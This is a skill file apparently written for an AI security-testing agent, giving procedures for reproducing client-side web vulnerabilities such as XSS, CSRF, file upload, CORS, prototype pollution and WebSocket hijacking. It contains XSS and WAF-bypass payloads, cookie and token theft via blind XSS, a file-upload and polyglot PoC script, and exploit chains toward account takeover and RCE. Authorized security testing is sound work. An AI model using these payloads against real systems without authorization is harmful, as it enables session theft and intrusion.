---
name: clientside-reproduce
description: XSS, CSRF, file upload, open redirect, clickjacking, CORS, prototype pollution. After HUNT confirms exploitable — confirmation, PoC creation, exploit adaptation. Use when testing CLIENTSIDE vulnerabilities.
---

# SKILL-CLIENTSIDE-REPRODUCE — Client-Side Vulnerabilities Reproduce — REPRODUCE
# Phase Coverage: 5-6, 17, 20-21, 25, 29-30, 33
# Vuln Classes: XSS, CSRF, File Upload, Open Redirect, Clickjacking, CORS,
#               Prototype Pollution, DOM Clobbering, WebSocket, PostMessage, Service Worker
# Purpose: Browser-based and client-side vulnerability confirmation, PoC development, and chain planning

---

## Phase 5: XSS — Reflected / Stored / DOM / Blind — CIA: C:H I:M

### SUB-PHASE 5.3: REPRODUCE

**MCP REPRODUCE WORKFLOW:**
```
mcp_firefox-devtools_clear_console_messages()
mcp_firefox-devtools_navigate_page(url="TARGET_URL_WITH_PAYLOAD")
sleep 2
mcp_firefox-devtools_list_console_messages()
mcp_firefox-devtools_screenshot_page()
```

**Blind XSS Reproduction (2026 Arsenal):**
```
CONFIRMATION CHECKLIST:
  □ OAST/interactsh received callback from admin browser IP?
  □ Callback contains document.cookie? → admin session theft (C:H)
  □ Callback contains localStorage data? → API key/token theft (C:H)
  □ Blind XSS fires in support ticket view? → staff session compromise (C:H)
  □ Blind XSS fires in admin user list? → admin session compromise (C:H)

POC SCRIPT:
  → Save to scripts/{SLUG}/blind_xss_{surface}.sh
  → Include: payload injection + OAST monitoring + callback verification
  → Include: context-specific payloads for each injection point

FALSE POSITIVE CHECK:
  → Callback from automated scanner/bot (not real admin)? → verify IP is from org
  → Payload encoded but not decoded by admin panel? → test different encodings
  → CSP blocks external script loading? → test inline event handler variants
```

**WAF Bypass Reproduction:**
```
WORKFLOW:
  1. Test each bypass technique systematically
  2. Record which technique bypasses the WAF
  3. Confirm XSS execution in browser
  4. Document the exact bypass chain

BYPASS TECHNIQUES:
  → Case variation: <ScRiPt> vs <script>
  → Null byte: <scr%00ipt>
  → HTML comments: <scr<!--script>ipt>
  → Encoding: &#x3C;script&#x3E;
  → Double encoding: %253Cscript%253E
  → Protocol: javascript&#x3a; or data&#x3a;
```
**Ref:** [[raw-refs/xss-blind-xss-arsenal-2026]]

### CHAIN OUTPUT:
  → Self-XSS (low) + CSRF = stored XSS delivery to victim (high)
  → Reflected XSS (medium) + admin session = admin ATO (critical)
  → DOM XSS (medium) + postMessage no-origin = token theft (high)
  → XSS + CORS misconfig = cross-origin data exfil (critical)
  → XSS + file-upload (SVG) = stored XSS delivery mechanism (high→critical)

---

## Phase 6: CSRF — CIA: I:H

### CHAIN OUTPUT:
  → CSRF (medium) + XSS = stored XSS → CSRF for account takeover (critical)
  → CSRF on password change (high standalone)
  → CSRF + admin endpoint = admin action on behalf of victim (critical)
  → CSRF + login CSRF = session fixation → account takeover (critical)

---

## Phase 17: File Upload Vulnerabilities — CIA: C:H I:H

### CHAIN OUTPUT:
  → File upload XSS (medium) + admin views uploads = admin session steal (high)
  → Polyglot upload (medium) + LFI = RCE (critical)
  → SVG upload (medium) + stored XSS + CSRF = account takeover (critical)
  → Zip slip (high) + path traversal = overwrite config files (critical)
  → Script file upload (.py, .jsp) (medium) + presigned URL distribution = S3 contamination (high)
  → Magic byte bypass (medium) + allowlist bypass = script execution (critical)

### Confirmation Checklist

```
□ File type validation:
  □ Which extensions are accepted? (test .py, .jsp, .php, .html, .exe, .sh)
  □ Which extensions are blocked? (test .php, .html first)
  □ Is there an allowlist? (test extensions outside the list)
  □ Is there a denylist? (test extensions on the list)

□ Magic byte validation:
  □ Does server check magic bytes? (upload file with wrong extension but valid magic bytes)
  □ Can magic bytes be bypassed? (upload script with valid magic byte header)
  □ Which magic bytes are checked? (JPEG, PNG, PDF, GIF)

□ Server-side validation:
  □ Is validation done client-side only? (bypass via curl/Burp)
  □ Is validation done server-side? (check response for validation errors)
  □ Is Content-Type header validated? (upload with wrong Content-Type)

□ Storage:
  □ Where are files stored? (local filesystem, S3, CDN)
  □ Are files accessible directly? (test direct URL access)
  □ Are presigned URLs generated? (check response for S3 URLs)
  □ Do presigned URLs expire? (test after 1 hour, 24 hours)

□ Impact:
  □ Can uploaded files be executed? (test if server serves with correct MIME type)
  □ Can uploaded files be distributed? (test sharing presigned URLs)
  □ What data is in the storage bucket? (check for other users' files)
```

### PoC Template

```bash
#!/bin/bash
# File Upload Vulnerability PoC
# CWE-434: Unrestricted Upload of File with Dangerous Type
TARGET=$1; TOKEN=$2; ENDPOINT=$3

echo "[*] File Upload PoC: $TARGET$ENDPOINT"
echo ""

# Step 1: Test script file upload
echo "[*] Step 1: Script file upload test"
echo 'print("RCE via Python")' > /tmp/test.py
echo '<%@ page import="java.io.*" %><% out.println("RCE via JSP"); %>' > /tmp/test.jsp

for ext in py jsp; do
  RESP=$(curl -sk -X POST "$TARGET$ENDPOINT" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@/tmp/test.${ext};filename=test.${ext}" \
    -w "\nHTTP:%{http_code}")
  STATUS=$(echo "$RESP" | tail -1)
  echo "$ext → $STATUS"
done

# Step 2: Extract presigned URL
echo ""
echo "[*] Step 2: Presigned URL extraction"
RESP=$(curl -sk -X POST "$TARGET$ENDPOINT" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/test.py;filename=evil.py;type=text/x-python")

PRESIGNED_URL=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['url'])" 2>/dev/null)
if [[ "$PRESIGNED_URL" == *"s3"* ]]; then
  echo "Presigned URL: $PRESIGNED_URL"
fi

# Step 3: Magic byte bypass
echo ""
echo "[*] Step 3: Magic byte bypass"
python3 -c "
with open('/tmp/poly.py','wb') as f:
    f.write(b'\xff\xd8\xff\xe0')  # JPEG magic bytes
    f.write(b'print(\"RCE via polyglot\")')
"
RESP=$(curl -sk -X POST "$TARGET$ENDPOINT" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/poly.py;filename=evil.py;type=application/octet-stream" \
  -w "\nHTTP:%{http_code}")
echo "Polyglot JPEG+Python → $(echo $RESP | tail -1)"

echo ""
echo "[*] Result: Script files accepted = CWE-434 confirmed"
```

---

## Phase 20: Open Redirect — CIA: C:M I:M

### CHAIN OUTPUT:
  → Open redirect (low) + OAuth = OAuth token theft = ATO (critical)
  → Open redirect + host-header injection = password reset poisoning (critical)
  → Open redirect + SSRF filter = SSRF bypass (high)
  → Open redirect + XSS = phishing lure with trusted domain (high)

---

## Phase 21: Clickjacking — CIA: I:M

### CHAIN OUTPUT:
  → Clickjacking on account delete (medium) + UI redress = forced account deletion (high)
  → Clickjacking on transfer endpoint (medium) + UI redress = financial fraud (high)
  → Clickjacking (low) + CSRF token bypass = combined high impact (high)

---

## Phase 25: CORS Misconfiguration — CIA: C:H

### CHAIN OUTPUT:
  → CORS with credentials (high) + IDOR = cross-origin full account data read (critical)
  → CORS + XSS = cross-origin token exfil from attacker-controlled page (critical)
  → CORS on subdomain + subdomain takeover = steal main domain API data (critical)

---

## Phase 29: Prototype Pollution — CIA: C:M I:H

### CHAIN OUTPUT:
  → PP (medium) → pollute isAdmin → access-control bypass → admin panel (critical)
  → PP (low query) + DOM XSS sink = XSS via prototype pollution (high)
  → PP + NODE_OPTIONS = RCE (critical)

---

## Phase 30: DOM Clobbering — CIA: C:M I:M

### CHAIN OUTPUT:
  → DOM clobbering (low) + script loading = XSS (high)
  → DOM clobbering + CSP bypass = stored XSS without script tag (high)
  → DOM clobbering (medium) + postMessage = cross-origin clobbering (high)

---

## Phase 33: WebSocket Security - CIA: C:H I:H

### SUB-PHASE 33.3: REPRODUCE

**Confirmation requirements (ALL must hold before saving finding):**
  □ Full handshake request/response captured (Caido stream + request id)
  □ Auth-model proof: no-ticket/garbage-ticket vs valid-ticket connections are identical
  □ Origin test matrix recorded (attacker.com / null / missing / suffix trick)
  □ Real-browser CSWSH proof (Playwright attacker page opened the WS, screenshot + console)
  □ Private channel subscribe from unauth connection recorded (blanket ack = authz gap)
  □ Control test: valid-ticket conn subscribed to same channels (compare data flow)
  □ ws:// downgrade result recorded (301→wss = negative; plaintext accept = positive)
  □ If injection claimed: dom_analyzer.py structural divergence = true

**PoC artifacts to save (scripts/{SLUG}/):**
  - cswsh_attacker.html - cross-origin page opening the WS with zero creds
  - ws_auth_bypass.py - no-ticket vs garbage vs valid connect comparison
  - ws_probe.py / ws_actions.py - channel + action enumeration
  - ws_push_test.py - long-lived unauth listener proving persistent connection

**Evidence capture (Playwright):**
  1. Serve attacker page: `python3 -m http.server 8090` (from scripts/{SLUG}/)
  2. browser_navigate to `http://127.0.0.1:8090/cswsh_attacker.html`
  3. browser_console_messages → capture `CSWSH:OPEN`, `CSWSH:RECV: {"type":"subscribed"...}`
  4. browser_take_screenshot → save to images/{SLUG}/cswsh-cross-origin.png

**Severity guidance:**
  - CSWSH with two-way interaction + cookie auth + private data = HIGH/CRITICAL (ATO/data exfil)
  - WS auth bypass (ticket decorative, any client welcome) + private channel subscribe = HIGH (CWE-306)
  - Per-message authz missing (subscribe to other users' channels) = HIGH if data confirmed, MEDIUM if subscribe-only
  - Blanket subscribe acks with no data observed = MEDIUM (authorization failure at subscribe layer, data flow unproven - be honest in report)

### CHAIN OUTPUT:
  → WebSocket CSWSH (high) + cookie auth = cross-origin WS session steal (critical)
  → WebSocket message injection + IDOR = cross-user data access (critical)
  → WebSocket + XSS = steal WS messages via DOM (high)
  → WS auth bypass + XSS on main app = open authenticated private stream from attacker origin
  → WS ticket survival + CSWSH = revoked-session data plane still reachable cross-origin

---

## Playwright MCP Integration

Client-side vulns REQUIRE browser verification — Playwright provides a real Chromium engine.

| Vuln Phase | Playwright Tool | Playbook |
|------------|----------------|----------|
| **XSS (Phase 5)** | `browser_evaluate` → inject payload, `browser_console_messages` → check markers | Navigate to URL with payload, capture console for `XSS:` marker, screenshot as evidence |
| **CSRF (Phase 6)** | `browser_evaluate` → auto-submit form, `browser_network_requests` → verify state change | Build CSRF PoC HTML, navigate to it, verify POST went through |
| **File Upload XSS (Phase 17)** | `browser_navigate` to uploaded SVG, `browser_console_messages` | Upload SVG with `<script>console.log('XSS:'+document.domain)</script>`, navigate to CDN URL, check console |
| **Open Redirect (Phase 20)** | `browser_navigate` with redirect URL, check final `browser_snapshot` URL | Verify redirect chain ends at attacker domain |
| **Clickjacking (Phase 21)** | `browser_evaluate` to create iframe overlay, `browser_take_screenshot` | Build CJ PoC HTML, navigate, screenshot the framed target |
| **CORS (Phase 25)** | `browser_evaluate` → `fetch()` from attacker origin, `browser_console_messages` | Run cross-origin fetch in browser context, observe CORS headers in network |
| **Prototype Pollution (Phase 29)** | `browser_navigate` with PP payload in URL, `browser_evaluate` → check polluted props | Navigate to `?__proto__[isAdmin]=true`, check `({}).isAdmin` |
| **DOM Clobbering (Phase 30)** | `browser_evaluate` → inject clobbering HTML, check `window.config` | Inject `<a id=config>` elements, verify window.config reads from DOM |
| **WebSocket CSWSH (Phase 33)** | `browser_evaluate` → `new WebSocket()` from different origin, check connection | Open WS from browser context, verify no origin validation |

### XSS Confirmation Workflow (Playwright)
```
1. browser_navigate(url="TARGET/search?q=<img src=x onerror=console.log('XSS_MARKER')>")
2. browser_console_messages(level="info") → grep for "XSS_MARKER"
3. browser_take_screenshot → evidence of DOM execution
4. browser_evaluate → extract document.cookie or localStorage to prove impact
```

### CSRF PoC Workflow (Playwright)
```
1. Write PoC HTML to /tmp/csrf_poc.html with auto-submitting form
2. browser_navigate(url="file:///tmp/csrf_poc.html")
3. browser_network_requests → verify POST to target with victim cookies
4. browser_take_screenshot → evidence
```

---
---

*SKILL-CLIENTSIDE-REPRODUCE — Part of the acy Agentic Security Research System v3.0*
